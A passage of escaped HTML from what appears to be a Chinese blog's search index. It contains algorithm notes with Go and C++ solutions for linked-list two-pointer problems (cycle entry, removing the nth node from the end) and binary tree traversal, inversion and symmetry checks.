style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，如图所示。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684493645.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;相遇时，慢指针走过的距离为：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;快指针走过的距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;而快指针走过的节点是慢指针的二倍，即：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;2(x+y)=x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最终要求的是&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=(n-1)(y+z)+z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;当&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;n=1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;时，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，即当两指针相遇时，从相遇节点和头节点各出发一个指针，当两指针相遇时记为头口节点。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684507077.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func detectCycle(head *ListNode) *ListNode {
    if head == nil {
        return nil
    }
    var fast, slow *ListNode
    fast, slow = head, head

    for true {
        if fast.Next != nil &amp;amp;&amp;amp; fast.Next.Next != nil {
            fast = fast.Next.Next
        } else {
            return nil
        }
        slow = slow.Next
        if fast == slow {
            index1, index2 := head, fast
            for index1 != index2 {
                index1 = index1.Next
                index2 = index2.Next
            }
            return index1
        }
    }
    return nil

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;删除链表的倒数第n个节点&#34;&gt;删除链表的倒数第N个节点※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/&lt;/p&gt;
&lt;p&gt;双指针首先都指向头节点，快指针先走n步，然后快慢指针再一起走，直到快指针到结尾，那么慢指针下一个元素即时要删除的元素。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func removeNthFromEnd(head *ListNode, n int) *ListNode {
    nilhead := &amp;amp;ListNode{
        0,
        head,
    }

    fast, slow := nilhead, nilhead
    for i := 0; i &amp;lt;= n; i++ {
        fast = fast.Next
    }

    for fast != nil {
        fast = fast.Next
        slow = slow.Next
    }

    slow.Next = slow.Next.Next

    return nilhead.Next
}
&lt;/code&gt;&lt;/pre&gt;
">【算法】双指针</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-shu/"" data-c="
          &lt;h3 id=&#34;二叉树的前中后序遍历&#34;&gt;二叉树的前中后序遍历&lt;/h3&gt;
&lt;h4 id=&#34;前序遍历&#34;&gt;前序遍历&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;前序遍历的访问和处理顺序是一致的&lt;/strong&gt;，即先访问当前节点，再将该节点的左子树和右子树加入栈中。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; preorderTraversal(TreeNode* root) {
        stack&amp;lt;TreeNode*&amp;gt; st;
        vector&amp;lt;int&amp;gt; result;
        if (root == NULL) return result;
        st.push(root);
        while (!st.empty()) {
            TreeNode* node = st.top();                       // 中
            st.pop();
            result.push_back(node-&amp;gt;val);
            if (node-&amp;gt;right) st.push(node-&amp;gt;right);
            if (node-&amp;gt;left) st.push(node-&amp;gt;left);
            // 先放右节点后放左节点，后进先出，所以出栈就是先左后右
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;中序遍历&#34;&gt;中序遍历&lt;/h4&gt;
&lt;p&gt;中序遍历的访问顺序和处理顺序是不一致的，即先访问该节点的左子树，返回来再访问该节点。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; inorderTraversal(TreeNode* root) {
        vector&amp;lt;int&amp;gt; result;
        stack&amp;lt;TreeNode*&amp;gt; st;
        TreeNode* cur = root;
        while (cur != NULL || !st.empty()) {
            if (cur != NULL) {
                st.push(cur);
                cur = cur-&amp;gt;left;
            }
            else {
                cur = st.top();
                st.pop();
                result.push_back(cur-&amp;gt;val);
                cur = cur-&amp;gt;right;
            }
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;后序遍历&#34;&gt;后序遍历&lt;/h4&gt;
&lt;p&gt;后序遍历是左右中，只需要将前序遍历的顺序变换一下就好了，前序遍历是先访问中，然后将右子树入栈、左子树入栈，最后的遍历的顺序就是中左右。&lt;/p&gt;
&lt;p&gt;而现在可以先访问中，然后将左子树入栈、右子树入栈，那么访问顺序就是中右左，最后访问完后，将访问序列逆序过来就是左右中了。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; postorderTraversal(TreeNode* root) {
        stack&amp;lt;TreeNode*&amp;gt; st;
        vector&amp;lt;int&amp;gt; result;
        if (root == NULL) return result;
        st.push(root);
        while (!st.empty()) {
            TreeNode* node = st.top();
            st.pop();
            result.push_back(node-&amp;gt;val);
            if (node-&amp;gt;left) st.push(node-&amp;gt;left); // 相对于前序遍历，这更改一下入栈顺序 （空节点不入栈）
            if (node-&amp;gt;right) st.push(node-&amp;gt;right); // 空节点不入栈
        }
        reverse(result.begin(), result.end()); // 将结果反转之后就是左右中的顺序了
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;二叉树的层次遍历&#34;&gt;二叉树的层次遍历&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; levelOrder(TreeNode* root) {
        queue&amp;lt;TreeNode*&amp;gt; que;
        if (root != NULL) que.push(root);
        vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; result;
        while (!que.empty()) {
            int size = que.size();
            vector&amp;lt;int&amp;gt; vec;
            // 这里一定要使用固定大小size，不要使用que.size()，因为que.size是不断变化的
            for (int i = 0; i &amp;lt; size; i++) {
                TreeNode* node = que.front();
                que.pop();
                vec.push_back(node-&amp;gt;val);
                if (node-&amp;gt;left) que.push(node-&amp;gt;left);
                if (node-&amp;gt;right) que.push(node-&amp;gt;right);
            }
            result.push_back(vec);
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;反转二叉树&#34;&gt;反转二叉树&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/invert-binary-tree/&lt;/p&gt;
&lt;p&gt;把每个节点的左右孩子调换顺序就行了，前序遍历和后序遍历都可以，但是中序遍历不行，因为中序遍历的特性会使有的节点的左右孩子调换两次。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    TreeNode* invertTree(TreeNode* root) {
        if(!root) return root;
        TreeNode *tmp = root-&amp;gt;left;
        root-&amp;gt;left = root-&amp;gt;right;
        root-&amp;gt;right = tmp;
        if(root-&amp;gt;left) invertTree(root-&amp;gt;left);
        if(root-&amp;gt;right)  invertTree(root-&amp;gt;right);
        return root;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;对称二叉树&#34;&gt;对称二叉树※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/symmetric-tree/submissions/&lt;/p&gt;
&lt;p&gt;这道题一开始我想的是直接层次遍历，看看每层的数值是不是“回文”，后来发现是“回文”是对称二叉树的必要不充分条件。&lt;/p&gt;
&lt;p&gt;这道题需要比较根节点的两个子树的是不是对称的，对于左子树来说遍历顺序可以是左右中，那么对于右子树来说遍历顺序是右左中，其实不算是严格的后序遍历。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;      1
     / \
    2   2
   / \ / \
  3  4 4  3
 / \     / \
5   6   6   5  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;左子树的左右中顺序遍历：56342&lt;/p&gt;
&lt;p&gt;右子树的右左中顺序遍历：56342&lt;/p&gt;
&lt;p&gt;所以可以用两个数组，分别将左右子树的按照刚才说的遍历顺序记录下来，然后对比是不是一样。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; left;
    vector&amp;lt;int&amp;gt; right;
    bool isSymmetric(TreeNode* root) {
        leftRightIn(root-&amp;gt;left);
        rightLeftIn(root-&amp;gt;right);
        if (left.size() != right.size()) {
            return false;
        }
        for (int i = 0; i &amp;lt; left.size(); i++ ){
            // cout &amp;lt;&amp;lt; left[i] &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; right[i] &amp;lt;&amp;lt; endl;
            if (left[i] != right[i]) {
                return false;
            }
        }
        return true;
    }

    void leftRightIn(TreeNode* root) { // 左右中
        if (root == NULL) {
            left.push_back(-1);
            return ;
        }
        leftRightIn(root-&amp;gt;left);
        leftRightIn(root-&amp;gt;right);
        left.push_back(root-&amp;gt;val);
    }

    void rightLeftIn(TreeNode* root) { // 右左中
        if (root == NULL) {
            right.push_back(-1);
            return ;
        }
        rightLeftIn(root-&amp;gt;right);
        rightLeftIn(root-&amp;gt;left);
        right.push_back(root-&amp;gt;val);
    }

};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还有一种就是直接找到与该节点对称的节点，比较两个节点的值以及他们子树的值，就不用建立数组记录访问顺序了：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool compare(TreeNode* left, TreeNode* right) {
        // 首先排除空节点的情况
        if (left == NULL &amp;amp;&amp;amp; right != NULL) return false;
        else if (left != NULL &amp;amp;&amp;amp; right == NULL) return false;
        else if (left == NULL &amp;amp;&amp;amp; right == NULL) return true;
        // 排除了空节点，再排除数值不相同的情况
        else if (left-&amp;gt;val != right-&amp;gt;val) return false;

        // 此时就是：左右节点都不为空，且数值相同的情况
        // 此时才做递归，做下一层的判断
        bool outside = compare(left-&amp;gt;left, right-&amp;gt;right);   // 比较左子树的左子树和右子树的右子树
        bool inside = compare(left-&amp;gt;right, right-&amp;gt;left);    // 比较左子树的右子树和右子树的左子树
        bool isSame = outside &amp;amp;&amp;amp; inside; 
        return isSame;

    }
    bool isSymmetric(TreeNode* root) {
        if (root == NULL) return true;
        return compare(root-&amp;gt;left, root-&amp;gt;right);
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;迭代法可以用队列，但是注意不是层次访问，每次将左-&amp;gt;左、右-&amp;gt;右、左-&amp;gt;右，右-&amp;gt;左加入队列，每次取出一对进行比较：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool isSymmetric(TreeNode* root) {
        if (root == NULL) return true;
        queue&amp;lt;TreeNode*&amp;gt; que;
        que.push(root-&amp;gt;left);   // 将左子树头结点加入队列
        que.push(root-&amp;gt;right);  // 将右子树头结点加入队列
        
        while (!que.empty()) {  // 接下来就要判断这两个树是否相互翻转
            TreeNode* leftNode = que.front(); que.pop();
            TreeNode* rightNode = que.front(); que.pop();
            if (!leftNode &amp;amp;&amp;amp; !rightNode) {  // 左节点为空、右节点为空，此时说明是对称的
                continue;
            }

            // 左右一个节点不为空，或者都不为空但数值不相同，返回false
            if ((!leftNode || !rightNode || (leftNode-&amp;gt;val != rightNode-&amp;gt;val))) {
                return false;
            }
            que.push(leftNode-&amp;gt;left);   // 加入左节点左孩子
            que.push(rightNode-&amp;gt;right); // 加入右节点右孩子
            que.push(leftNode-&amp;gt;right);  // 加入左节点右孩子
            que.push(rightNode-&amp;gt;left);  // 加入右节点左孩子
        }
        return true;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于队列每次只是存储每一层的节点，且每次从队列中取出的节点是一对，对与对之间的顺序不用严格控制，所以可以把队列直接替换成栈也行。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool isSymmetric(TreeNode* root) {
        if (root == NULL) return true;
        stack&amp;lt;TreeNode*&amp;gt; st; // 这里改成了栈
        st.push(root-&amp;gt;left);
        st.push(root-&amp;gt;right);
        while (!st.empty()) {
            TreeNode* leftNode = st.top(); st.pop();
            TreeNode* rightNode = st.top(); st.pop();
            if (!leftNode &amp;amp;&amp;amp; !rightNode) {
                continue;
            }
            if ((!leftNode || !rightNode || (leftNode-&amp;gt;val != rightNode-&amp;gt;val))) {
                return false;
            }
            st.push(leftNode-&amp;gt;left);
            st.push(rightNode-&amp;gt;right);
            st.push(leftNode-&amp;gt;right);
